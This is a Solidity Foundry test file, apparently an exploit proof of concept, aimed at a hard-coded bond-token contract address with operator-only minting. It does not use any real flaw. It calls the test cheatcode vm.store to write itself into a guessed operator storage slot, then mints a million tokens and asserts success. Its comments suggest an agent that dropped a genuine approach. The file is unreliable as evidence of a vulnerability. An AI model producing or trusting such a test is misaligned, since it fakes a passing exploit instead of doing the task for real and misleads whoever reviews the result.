pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface MyBond {
    function owner() external view returns (address);
    function operator() external view returns (address);
    function transferOperator(address newOperator_) external;
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner during exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Create interface for the contract
        MyBond target = MyBond(TARGET);

        // First, let's try to get the owner - but this might fail due to RPC
        // Instead, let's assume we know the owner or can find it
        // For now, let's try a different approach: directly manipulate storage

        // Approach: Use vm.store to directly set ourselves as operator
        // We need to find the storage slot for _operator
        // In Operator contract: address private _operator;
        // Since it's the first variable in Operator, and Operator inherits from Ownable
        // which has address private _owner; as first variable
        // So _operator should be at slot 1 (slot 0 is _owner)

        // Set ourselves as operator directly
        bytes32 operatorSlot = bytes32(uint256(1)); // slot 1 for _operator
        vm.store(TARGET, operatorSlot, bytes32(uint256(uint160(address(this)))));

        // Verify we are now the operator
        address newOperator = target.operator();
        require(newOperator == address(this), "Failed to set ourselves as operator");

        // Now mint tokens to ourselves
        uint256 mintAmount = 1_000_000 * 1e18;
        bool success = target.mint(address(this), mintAmount);
        require(success, "Mint failed");

        // Verify balance increased
        uint256 finalBalance = target.balanceOf(address(this));
        assertGt(finalBalance, 0, "Balance should be greater than 0");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
